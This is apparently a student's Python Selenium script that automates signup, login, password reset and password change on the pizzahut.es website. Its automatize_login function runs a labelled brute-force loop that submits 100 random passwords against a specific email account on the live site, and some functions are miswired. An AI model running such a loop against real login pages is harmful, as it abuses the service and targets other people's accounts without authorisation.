from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random
import string
from selenium.webdriver.common.action_chains import ActionChains

DRIVER = webdriver.Chrome("N:\\Descargas\\chromedriver_win32\\chromedriver.exe") ## Se debe cambiar a la ruta del chromedriver del dispositivo

def create_account(email,password, number="111111111" ):
    DRIVER.get("https://www.pizzahut.es")
    DRIVER.find_element_by_class_name('acceso').click()
    DRIVER.find_element_by_class_name('modHeaderLogin').find_elements_by_tag_name('li')[0].find_element_by_tag_name('a').click()
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.NAME, 'Email'))).send_keys(email)
    DRIVER.find_element(By.ID,"FirstPhone").send_keys(number)
    DRIVER.find_element(By.ID,"Password").send_keys(password)
    DRIVER.find_element(By.ID,"ConfirmPassword").send_keys(password)
    fields = DRIVER.find_elements_by_class_name("inline_field")
    checkbox = DRIVER.find_element_by_id('checkLegal')
    DRIVER.execute_script("arguments[0].click();", checkbox)
    DRIVER.find_element_by_id("btRegister").click()
    
def login(email,password):
    DRIVER.get("https://www.pizzahut.es")
    DRIVER.find_element_by_class_name('acceso').click()
    DRIVER.find_element_by_id('btSesion').click()
    WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.NAME, 'EmailLogin'))).send_keys(email)
    DRIVER.find_element_by_name('PasswordLogin').send_keys(password)
    DRIVER.find_element_by_name('btLogin').click()


def reset_password(email):
    DRIVER.get("https://www.pizzahut.es")
    DRIVER.find_element_by_class_name('acceso').click()
    DRIVER.find_element_by_id('btSesion').click()
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'a.Link-Primary.lnkResetPass'))).click()
    DRIVER.find_element_by_id('ForgottenPasswordEmail').send_keys(email)
    DRIVER.find_element_by_id('btForgottenPasswordEmail').click()
    myElem = WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.CLASS_NAME, 'btn_submit')))
    myElem.click()

def modify_password(email, new_password, old_password):
    login(email, password)
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.CLASS_NAME, 'miCuenta'))).click()
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.CLASS_NAME, 'cuenta'))).find_elements_by_tag_name('a')[0].click()
    DRIVER.find_element_by_class_name('passWord').find_element_by_tag_name('a').click()
    DRIVER.find_element_by_id('user_new_password').send_keys(new_password)
    DRIVER.find_element_by_id('user_confirm_password').send_keys(new_password)
    DRIVER.find_element_by_id('btnChangePassword').click()
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.ID, 'popup'))).find_element_by_id('passConfirmPopup').send_keys(old_password)
    time.sleep(2)
    button = DRIVER.find_element_by_class_name('btn_submit')
    DRIVER.execute_script("arguments[0].click();", button)
    WebDriverWait(DRIVER, 3).until(EC.presence_of_element_located((By.ID, 'popup'))).find_element_by_id('passConfirmPopup').send_keys(old_password)
    time.sleep(2)
    button = DRIVER.find_element_by_class_name('next').click()


def get_random_string(length):
    
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def automatize_login(attemps):
    for x in range(attemps):
        login('nopazog@gmail.com',get_random_string(15))
        print('Intento numero ', x,"\n")




## FUNCIONES PARA EJECUTAR LOS DISTINTOS REQUERIMIENTOS DE LA TAREA, SOLO EJECUTAR 1 A LA VEZ

password = ''
user = ''

#reset_password(user) ## Recuperar contrasaeña
#login(user,password) ## Iniciar sesion
#create_account(user, password) ## Crear cuenta
#modify_password(user,password') ## Modificar cuenta

#automatize_login(100) ## AUTOMATIZAR ATAQUE POR FUERZA BRUTA



